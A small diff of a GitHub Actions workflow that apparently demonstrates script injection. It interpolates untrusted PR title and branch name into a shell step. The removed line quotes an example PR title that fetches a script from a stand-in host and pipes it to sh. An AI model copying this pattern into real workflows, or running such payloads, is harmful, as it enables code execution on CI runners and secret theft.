@@ -15,7 +15,7 @@ jobs:
   welcome:
     runs-on: ubuntu-latest
     steps:
-      - name: Greet (RCE if PR title is `$(curl https://example.invalid/x | sh)`)
+      - name: Greet (RCE if the PR title is a command substitution)
         run: |
           echo "Hello! Reviewing PR titled: ${{ github.event.pull_request.title }}"
           echo "Branch is ${{ github.head_ref }}"
